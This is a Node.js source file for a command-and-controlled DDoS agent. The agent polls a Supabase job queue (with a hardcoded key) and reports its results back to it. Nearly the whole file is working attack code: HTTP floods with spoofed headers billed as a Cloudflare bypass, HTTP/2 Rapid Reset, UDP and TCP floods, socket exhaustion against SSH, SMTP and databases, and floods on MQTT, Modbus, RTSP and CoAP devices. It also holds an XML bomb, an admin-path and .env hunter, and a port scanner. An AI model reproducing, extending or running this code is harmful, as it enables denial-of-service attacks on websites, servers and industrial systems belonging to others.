/**
 * SECURITYFORGE TITAN AGENT V42.1 (FULL SUITE)
 * 
 * [OPTIMIZATION LOG]
 * - L7: Browser Mimicry + Cache Busting + HTTP/2 Rapid Reset.
 * - L4: UDP Packet Batching (100x) + TCP Socket Burning.
 * - IoT: Zero-Allocation Buffers for MQTT/RTSP/CoAP.
 * - INFRA: Fail-fast timeouts (500ms) for SSH/SMTP flooding.
 */

const https = require('https');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const tls = require('tls');
const dgram = require('dgram');
const crypto = require('crypto');
const dns = require('dns');

// ==========================================
// 1. CONFIGURATION
// ==========================================
const C2_CONFIG = {
    url: "https://qbedywgbdwxaucimgiok.supabase.co",
    key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo",
    pollInterval: 800,
    reportInterval: 2000
};

const STATE = {
    activeJob: null,
    running: false,
    stats: {
        totalReqs: 0,
        success: 0,
        failed: 0,
        latencySum: 0,
        latencyCount: 0,
        maxLatency: 0,
        startTime: 0
    },
    logs: [],
    priorityLogs: [],
    discovered: new Set(),
    lastReport: 0,
    dynamicPaths: []
};

// ==========================================
// 2. INDUSTRIAL PAYLOADS
// ==========================================
// Shared Zero-Allocation Buffers (High Performance)
const BUFFERS = {
    JUNK: Buffer.allocUnsafe(1400).fill('X'),
    MQTT_CONNECT: Buffer.from([0x10, 0x12, 0x00, 0x04, 0x4d, 0x51, 0x54, 0x54, 0x04, 0x02, 0x00, 0x3c, 0x00, 0x06, 0x63, 0x6c, 0x69, 0x65, 0x6e, 0x74]),
    MODBUS_QUERY: Buffer.from('00010000000601030000000a', 'hex'),
    COAP_PAYLOAD: Buffer.from('40011234', 'hex'),
    XML_BOMB: Buffer.from('<?xml version="1.0"?><!DOCTYPE l [<!ENTITY x "x"><!ENTITY y "&x;&x;&x;">]><r>&y;</r>')
};

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

const BROWSER_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Connection': 'keep-alive'
};

const BASE_ADMIN_PATHS = [
    '/admin', '/wp-admin', '/login', '/dashboard', '/.env', '/config.php', '/backup.sql'
];

// ==========================================
// 3. UTILITIES
// ==========================================
const log = (msg, type = 'INFO') => {
    const entry = `[${type}] ${msg}`;
    console.log(entry);
    if (type === 'SUCCESS' || type === 'FOUND' || type === 'OPEN' || type === 'ERROR') {
        STATE.priorityLogs.push(entry);
    } else {
        STATE.logs.push(entry);
    }
};

const makeSupabaseRequest = (method, path, body = null) => {
    return new Promise((resolve) => {
        const url = new URL(`${C2_CONFIG.url}/rest/v1/${path}`);
        const options = {
            hostname: url.hostname,
            path: url.pathname + url.search,
            method: method,
            headers: {
                'apikey': C2_CONFIG.key,
                'Authorization': `Bearer ${C2_CONFIG.key}`,
                'Content-Type': 'application/json',
                'Prefer': 'return=representation'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => resolve(data ? JSON.parse(data) : null));
        });
        req.on('error', () => resolve(null));
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
};

const getTargetDetails = (urlStr) => {
    try {
        const u = new URL(urlStr.startsWith('http') ? urlStr : 'http://' + urlStr);
        return {
            host: u.hostname,
            port: u.port || (u.protocol === 'https:' ? 443 : 80),
            path: u.pathname,
            protocol: u.protocol.replace(':', ''),
            isSsl: u.protocol === 'https:'
        };
    } catch { return null; }
};

// ==========================================
// 4. ATTACK ENGINES (FULL SUITE)
// ==========================================

// --- L7: HTTP/1.1 FLOOD (CLOUDFLARE BYPASS) ---
const runHttpFlood = (job, target) => {
    const lib = target.isSsl ? https : http;
    const agent = new lib.Agent({ keepAlive: true, maxSockets: Infinity, maxFreeSockets: 256 });
    
    const attack = () => {
        if (!STATE.running) return;
        const method = job.method === 'GET' ? 'GET' : 'POST';
        const start = process.hrtime();
        
        // Dynamic Cache Busting
        const cb = job.use_chaos ? `?_=${Math.random().toString(36).slice(2)}` : '';
        const path = target.path + cb;

        const req = lib.request({
            host: target.host,
            port: target.port,
            path: path,
            method: method,
            agent: agent,
            rejectUnauthorized: false,
            headers: {
                ...BROWSER_HEADERS,
                'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
            }
        }, (res) => {
            const diff = process.hrtime(start);
            const ms = (diff[0] * 1000 + diff[1] / 1e6);
            STATE.stats.latencySum += ms;
            STATE.stats.maxLatency = Math.max(STATE.stats.maxLatency, ms);
            STATE.stats.latencyCount++;
            STATE.stats.success++;
            res.resume();
            if (STATE.running) setImmediate(attack);
        });

        req.on('error', () => STATE.stats.failed++);
        if (method === 'POST') req.write(job.use_xml_bomb ? BUFFERS.XML_BOMB : (job.body || '{"test":true}'));
        req.end();
    };
    for(let i=0; i<5; i++) attack(); 
};

// --- L7: HTTP/2 (RAPID RESET) ---
const runHttp2Flood = (job, target) => {
    if (!target.isSsl) return;
    
    const connect = () => {
        if (!STATE.running) return;
        const client = http2.connect(`https://${target.host}:${target.port}`, { 
            rejectUnauthorized: false,
            peerMaxConcurrentStreams: 5000 
        });
        
        client.on('error', () => STATE.stats.failed++);
        client.on('close', () => { if(STATE.running) connect(); });

        const spam = () => {
            if (client.destroyed || !STATE.running) return;
            // Batch 50 streams per tick
            for (let i=0; i<50; i++) {
                const req = client.request({ 
                    ':path': target.path, 
                    ':method': job.method || 'GET',
                    ...BROWSER_HEADERS
                });
                req.on('response', () => STATE.stats.success++);
                req.on('error', () => STATE.stats.failed++);
                req.end();
                // RAPID RESET
                if (job.use_god_mode) req.close(http2.constants.NGHTTP2_CANCEL);
            }
            if (STATE.running) setTimeout(spam, 10);
        };
        spam();
    };
    connect();
};

// --- L4: NETJAM (TITAN BATCHING) ---
const runRawFlood = (job, target, type) => {
    if (type === 'UDP' || type === 'FRAG') {
        const client = dgram.createSocket('udp4');
        const flood = () => {
            if (!STATE.running) { client.close(); return; }
            // 100 Packets per tick - Saturation Mode
            for(let i=0; i<100; i++) {
                client.send(BUFFERS.JUNK, target.port, target.host, (err) => {
                    if(err) STATE.stats.failed++; else STATE.stats.success++;
                });
            }
            if(STATE.running) setImmediate(flood);
        };
        flood();
    } else if (type === 'SYN') {
        const attack = () => {
            if (!STATE.running) return;
            const s = new net.Socket();
            s.setTimeout(500); // Fail fast
            s.connect(target.port, target.host, () => { 
                STATE.stats.success++; 
                s.write(BUFFERS.JUNK); 
                s.destroy(); // Burn
            });
            s.on('error', () => { STATE.stats.failed++; s.destroy(); });
            s.on('close', () => { if(STATE.running) setImmediate(attack); });
        };
        for(let i=0; i<10; i++) attack();
    }
};

// --- INFRA: SSH / SMTP / DB (SOCKET BURNER) ---
const runInfraStress = (job, target, type) => {
    const port = type === 'SSH' ? 22 : type === 'SMTP' ? 25 : 3306;
    const attack = () => {
        if (!STATE.running) return;
        const s = new net.Socket();
        s.setTimeout(1000);
        s.connect(port, target.host, () => {
            STATE.stats.success++;
            if (type === 'SSH') s.write('SSH-2.0-Titan_Bot_V42\r\n');
            if (type === 'SMTP') s.write('EHLO securityforge.local\r\n');
            // Acid Rain: Open/Close rapidly
            if (job.use_acid_rain) s.destroy();
        });
        s.on('data', (d) => {
            if (type === 'SSH' && d.toString().includes('SSH')) {
                const banner = d.toString().trim();
                if (!STATE.discovered.has(banner)) {
                    STATE.discovered.add(banner);
                    log(`BANNER: ${banner}`, 'FOUND');
                }
            }
            s.destroy();
        });
        s.on('error', () => { STATE.stats.failed++; s.destroy(); });
        s.on('close', () => { if(STATE.running) setImmediate(attack); });
    };
    for(let i=0; i<5; i++) attack();
};

// --- IOT: PROTOCOL FLOODS (OPTIMIZED) ---
const runIoTFlood = (job, target, protocol) => {
    if (protocol === 'UDP_IOT') {
        const client = dgram.createSocket('udp4');
        const port = job.use_coap_burst ? 5683 : 3702; // CoAP or WS-Discovery
        const flood = () => {
            if (!STATE.running) { client.close(); return; }
            for(let i=0; i<50; i++) {
                client.send(BUFFERS.COAP_PAYLOAD, port, target.host, (err) => {
                    if(err) STATE.stats.failed++; else STATE.stats.success++;
                });
            }
            if(STATE.running) setImmediate(flood);
        };
        flood();
    } else {
        // TCP IoT (MQTT/RTSP/Modbus)
        const port = protocol === 'MQTT' ? 1883 : protocol === 'MODBUS' ? 502 : 554;
        const payload = protocol === 'MQTT' ? BUFFERS.MQTT_CONNECT : 
                        protocol === 'MODBUS' ? BUFFERS.MODBUS_QUERY : 
                        Buffer.from(`DESCRIBE rtsp://${target.host} RTSP/1.0\r\n\r\n`);
        
        const attack = () => {
            if (!STATE.running) return;
            const s = new net.Socket();
            s.setTimeout(500);
            s.connect(port, target.host, () => {
                STATE.stats.success++;
                s.write(payload);
                s.destroy();
            });
            s.on('error', () => { STATE.stats.failed++; s.destroy(); });
            s.on('close', () => { if(STATE.running) setImmediate(attack); });
        };
        for(let i=0; i<5; i++) attack();
    }
};

// --- RECON: PORT & ADMIN ---
const runRecon = (job, target) => {
    // 1. Admin Hunter
    if (job.use_admin_hunter) {
        const path = BASE_ADMIN_PATHS[Math.floor(Math.random() * BASE_ADMIN_PATHS.length)];
        const req = (target.isSsl ? https : http).get({
            host: target.host, port: target.port, path: path, rejectUnauthorized: false
        }, (res) => {
            if (res.statusCode < 404) {
                const msg = `FOUND ${path} [${res.statusCode}]`;
                if(!STATE.discovered.has(msg)) { STATE.discovered.add(msg); log(msg, 'FOUND'); }
            }
        });
        req.on('error', () => {});
        req.end();
        if(STATE.running) setTimeout(() => runRecon(job, target), 200);
    }
    
    // 2. Port Scan
    if (job.use_port_scan) {
        const commonPorts = [21,22,23,25,53,80,443,3306,8080,8443,27017];
        const p = commonPorts[Math.floor(Math.random() * commonPorts.length)];
        const s = new net.Socket();
        s.setTimeout(1000);
        s.connect(p, target.host, () => {
            const msg = `OPEN PORT ${p}`;
            if(!STATE.discovered.has(msg)) { STATE.discovered.add(msg); log(msg, 'OPEN'); }
            s.destroy();
        });
        s.on('error', () => s.destroy());
        s.on('timeout', () => s.destroy());
        if(STATE.running) setTimeout(() => runRecon(job, target), 100);
    }
};

// ==========================================
// 5. JOB DISPATCHER
// ==========================================
const startJob = (job) => {
    if (STATE.running) return;
    STATE.activeJob = job;
    STATE.running = true;
    STATE.stats = { totalReqs: 0, success: 0, failed: 0, latencySum: 0, latencyCount: 0, maxLatency: 0, startTime: Date.now() };
    
    log(`TITAN ENGINE V42.1 | TARGET: ${job.target} | MODE: ${job.method}`);
    const target = getTargetDetails(job.target);
    if (!target) return;

    const threads = Math.min(job.concurrency || 50, 500);

    for (let i = 0; i < threads; i++) {
        // --- LAYER 4 & INFRA ---
        if (job.use_syn_flood) runRawFlood(job, target, 'SYN');
        else if (job.use_frag_attack) runRawFlood(job, target, 'FRAG');
        else if (job.method === 'UDP') runRawFlood(job, target, 'UDP');
        
        // --- INFRASTRUCTURE ---
        else if (job.use_ssh_hydra) runInfraStress(job, target, 'SSH');
        else if (job.use_smtp_storm) runInfraStress(job, target, 'SMTP');
        else if (job.use_acid_rain) runInfraStress(job, target, 'DB');

        // --- IOT ---
        else if (job.use_mqtt_flood) runIoTFlood(job, target, 'MQTT');
        else if (job.use_modbus_storm) runIoTFlood(job, target, 'MODBUS');
        else if (job.use_rtsp_storm) runIoTFlood(job, target, 'RTSP');
        else if (job.use_coap_burst) runIoTFlood(job, target, 'UDP_IOT');

        // --- LAYER 7 ---
        else if (job.use_http2) runHttp2Flood(job, target);
        else runHttpFlood(job, target);
    }
    
    // Recon runs on separate interval
    if (job.use_admin_hunter || job.use_port_scan) runRecon(job, target);
};

const stopJob = () => {
    STATE.running = false;
    log("ENGINE STOPPED");
};

// ==========================================
// 6. MAIN LOOP & REPORTING
// ==========================================
setInterval(async () => {
    if (STATE.running && STATE.activeJob) {
        const now = Date.now();
        const elapsed = (now - STATE.stats.startTime) / 1000;
        
        if (now - STATE.lastReport > C2_CONFIG.reportInterval) {
            const rps = STATE.stats.success / (elapsed || 1); 
            const avgLat = STATE.stats.latencyCount > 0 ? (STATE.stats.latencySum / STATE.stats.latencyCount) : 0;
            
            if (STATE.activeJob.duration && elapsed > STATE.activeJob.duration) {
                await makeSupabaseRequest('PATCH', `jobs?id=eq.${STATE.activeJob.id}`, { status: 'COMPLETED' });
                stopJob();
                return;
            }

            const payload = {
                current_rps: Math.round(rps),
                avg_latency: Math.round(avgLat),
                max_latency: Math.round(STATE.stats.maxLatency),
                total_success: STATE.stats.success,
                total_failed: STATE.stats.failed
            };
            
            if (STATE.priorityLogs.length > 0 || STATE.logs.length > 0) {
                 const combined = [...STATE.priorityLogs, ...STATE.logs].slice(0, 50);
                 payload.logs = JSON.stringify(combined);
                 STATE.priorityLogs = [];
                 STATE.logs = [];
            }

            const res = await makeSupabaseRequest('PATCH', `jobs?id=eq.${STATE.activeJob.id}`, payload);
            if (res && res[0] && res[0].status === 'STOPPED') stopJob();
            STATE.lastReport = now;
        }
    } else {
        const jobs = await makeSupabaseRequest('GET', 'jobs?status=eq.PENDING&limit=1&select=*');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            await makeSupabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startJob(job);
        }
    }
}, C2_CONFIG.pollInterval);

http.createServer((req, res) => res.end('Titan V42.1 Online')).listen(process.env.PORT || 3000);
console.log('SecurityForge Titan Agent V42.1 (Full Suite) Online');
